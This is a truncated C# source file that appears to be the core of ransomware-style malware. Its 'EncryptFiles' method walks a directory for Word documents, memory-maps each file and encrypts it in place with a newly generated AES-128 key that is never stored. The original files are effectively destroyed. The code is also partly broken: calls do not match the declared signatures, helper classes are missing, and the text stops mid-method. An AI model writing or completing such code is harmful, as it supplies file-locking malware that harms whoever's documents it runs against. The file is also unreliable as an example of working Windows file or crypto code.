using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

public class FileEncryption
{
    // Constants for file mapping
    private const int PAGE_READWRITE = 0x04;
    private const int FILE_MAP_WRITE = 0x02;
    private const int FILE_MAP_READ = 0x04;

    // Constants for AES encryption
    private const int AES_KEY_SIZE = 128;
    private const int CALG_AES_128 = 0x0000660E;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool CryptGenKey(IntPtr hProv, uint Algid, uint dwFlags, out IntPtr phKey);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, uint dwFlags, byte[] pbData, ref uint pdwDataLen, uint dwBufLen);

    public static void EncryptFiles(string directory)
    {
        string[] files = Directory.GetFiles(directory, "*.doc*");

        foreach (string file in files)
        {
            // Step 1: Get file handle
            IntPtr fileHandle = CreateFile(file);

            // Step 2: Get file size
            long fileSize = GetFileSize(fileHandle);

            // Step 3: Create file mapping
            IntPtr fileMapping = CreateFileMapping(fileHandle, fileSize);

            // Step 4: Map view of file
            IntPtr fileView = MapViewOfFile(fileMapping, fileSize);

            // Step 5: Generate AES-128 key
            IntPtr aesKey = GenerateAESKey();

            // Step 6: Encrypt file contents
            EncryptFileContents(fileView, fileSize, aesKey);

            // Cleanup
            UnmapViewOfFile(fileView);
            CloseHandle(fileMapping);
            CloseHandle(fileHandle);
            CloseHandle(aesKey);
        }
    }

    private static IntPtr CreateFile(string filePath)
    {
        IntPtr fileHandle = NativeMethods.CreateFile(filePath, FileAccess.ReadWrite, FileShare.None, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
        if (fileHandle == IntPtr.Zero || fileHandle.ToInt64() == -1)
        {
            throw new Exception("Failed to open file: " + filePath);
        }

        return fileHandle;
    }

    private static long GetFileSize(IntPtr fileHandle)
    {
        NativeMethods.FILE_STANDARD_INFO fileInfo;
        if (!NativeMethods.GetFileInformationByHandleEx(fileHandle, NativeMethods.FILE_INFO_BY_HANDLE_CLASS.FileStandardInfo, out fileInfo, (uint)Marshal.SizeOf<NativeMethods.FILE_STANDARD_INFO>()))
        {
            throw new Exception("Failed to get file information.");
        }

        return fileInfo.EndOfFile;
    }

    private static IntPtr CreateFileMapping(IntPtr fileHandle, long fileSize)
   
